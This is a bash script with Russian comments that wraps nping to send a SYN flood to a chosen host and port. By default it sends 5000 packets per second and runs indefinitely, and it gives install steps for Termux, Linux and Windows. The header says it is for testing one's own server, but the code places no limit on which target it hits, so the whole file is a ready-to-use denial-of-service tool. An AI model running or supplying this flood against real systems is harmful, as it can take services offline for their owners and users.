#!/bin/bash
# SYN-flood тест для собственного сервера (обёртка над nping из пакета nmap).
# Использование: ./synflood.sh -h HOST [-p PORT] [-r RATE_PPS] [-t DURATION_SEC]
#   HOST          - IP/домен вашего сервера (обязательно)
#   PORT          - целевой порт, по умолчанию 80
#   RATE_PPS      - пакетов в секунду, по умолчанию 5000
#   DURATION_SEC  - длительность в секундах, по умолчанию 0 (бесконечно, Ctrl+C для остановки)

HOST=""
PORT=80
RATE=5000
DURATION=0

usage() {
    echo "Использование: $0 -h HOST [-p PORT] [-r RATE_PPS] [-t DURATION_SEC]"
    exit 1
}

while getopts "h:p:r:t:" opt; do
    case $opt in
        h) HOST="$OPTARG" ;;
        p) PORT="$OPTARG" ;;
        r) RATE="$OPTARG" ;;
        t) DURATION="$OPTARG" ;;
        *) usage ;;
    esac
done

[ -z "$HOST" ] && usage

if ! command -v nping >/dev/null 2>&1; then
    echo "[-] nping не найден."
    echo "    Termux:  pkg install -y nmap"
    echo "    Linux:   apt install -y nmap"
    echo "    Windows: winget install -e --id Insecure.Nmap  (ставит nping + драйвер Npcap)"
    exit 1
fi

COUNT_ARGS=(--count 0)
if [ "$DURATION" -gt 0 ]; then
    COUNT_ARGS=(--count $((RATE * DURATION)))
fi

echo "[+] SYN-flood на $HOST:$PORT, скорость ~$RATE pps"
echo "[!] nping требует прав на raw-сокеты: root (Termux/Linux) или запуск от администратора (Windows)"
nping --tcp -p "$PORT" --flags SYN --rate "$RATE" "${COUNT_ARGS[@]}" "$HOST"
